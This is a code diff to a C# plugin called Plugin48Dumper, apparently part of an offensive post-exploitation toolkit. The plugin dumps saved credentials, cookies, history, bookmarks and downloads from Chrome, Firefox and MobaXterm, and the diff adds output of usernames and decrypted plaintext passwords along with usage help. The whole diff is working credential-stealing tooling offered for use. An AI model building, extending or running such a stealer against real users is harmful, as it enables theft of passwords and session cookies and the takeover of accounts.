@@ -23,6 +23,7 @@ namespace Plugin48Dumper
 
         private List<clsDumper> m_lsModule = new List<clsDumper>()
         {
+            //new clsEdgeDumper(),
             new clsChromeDumper(),
             new clsFirefoxDumper(),
             new clsMobaXtermDumper(),
@@ -38,7 +39,11 @@ namespace Plugin48Dumper
             {
                 Author = "ISSAC",
                 Description = "A tool for dumping information.",
-                Usage = "dumper target=<Target> <Option>",
+                Usage = "" +
+                "dumper <Command> target=<Target> <Option>\n" +
+                "Example:\n" +
+                "\tdumper ls\n" +
+                "\tdumper dump target=chrome history\n",
             };
 
             _table = new DataTable();
@@ -61,9 +66,21 @@ namespace Plugin48Dumper
         public object Execute(IDictionary<string, object> args)
         {
             List<string> lsKey = args.Keys.ToList();
+            if (lsKey.Count == 0)
+            {
+                clsTools.fnLogInfo(Attribute.Usage);
+                clsTools.fnPrintTable(_table);
+                return string.Empty;
+            }
+
             string szCmd = lsKey[0];
 
-            if (szCmd == "ls")
+            if (szCmd == "help")
+            {
+                clsTools.fnLogInfo(Attribute.Usage);
+                clsTools.fnPrintTable(_table);
+            }
+            else if (szCmd == "ls")
             {
                 DataTable dt = new DataTable();
                 dt.Columns.Add("Module");
@@ -121,7 +138,7 @@ namespace Plugin48Dumper
                     }
                     else if (szAction == "history")
                     {
-                        var ls = module.fnlsDumpHistory(nCount, szRegex);
+                        var ls = module.fnDumpHistory(nCount, szRegex);
                         foreach (var history in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
@@ -137,13 +154,19 @@ namespace Plugin48Dumper
                     }
                     else if (szAction == "cred")
                     {
-                        var ls = module.fnlsDumpCredential(nCount, szRegex);
+                        var ls = module.fnDumpCredential(nCount, szRegex);
                         foreach (var cred in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
 
                             clsTools.fnLogOK("[URL]: " + cred.URL);
-                            clsTools.fnLogOK("[Password]: " + cred.Password);
+                            clsTools.fnLogOK("[Username]: " + cred.Username);
+
+                            if (cred.Decrypted)
+                                clsTools.fnLogOK("[Password]: " + cred.Password);
+                            else
+                                clsTools.fnLogOK("[Password Cipher]: " + cred.Password);
+                            
                             clsTools.fnLogOK("[Creation Date]: " + cred.szCreationDate);
                             clsTools.fnLogOK("[Last Used]: " + cred.szLastUsed);
                         }
@@ -154,7 +177,7 @@ namespace Plugin48Dumper
                     }
                     else if (szAction == "cookie")
                     {
-                        var ls = module.fnlsDumpCookie(nCount, szRegex);
+                        var ls = module.fnDumpCookie(nCount, szRegex);
                         foreach (var cookie in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
@@ -170,7 +193,7 @@ namespace Plugin48Dumper
                     }
                     else if (szAction == "bookmark")
                     {
-                        var ls = module.fnlsDumpBookmark(nCount);
+                        var ls = module.fnDumpBookmark(nCount);
                         foreach (var bookMark in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
@@ -188,7 +211,7 @@ namespace Plugin48Dumper
                     }
                     else if (szAction == "download")
                     {
-                        var ls = module.fnlsDumpDownload(nCount, szRegex);
+                        var ls = module.fnDumpDownload(nCount, szRegex);
                         foreach (var download in ls)
                         {
                             clsTools.fnLogOK(new string('=', 50));
@@ -299,6 +322,7 @@ namespace Plugin48Dumper
 
                     if (szAction == "help")
                     {
+                        clsTools.fnLogInfo(xterm.Usage);
                         clsTools.fnPrintTable(xterm.dtHelp);
                     }
                     else if (szAction == "cred")
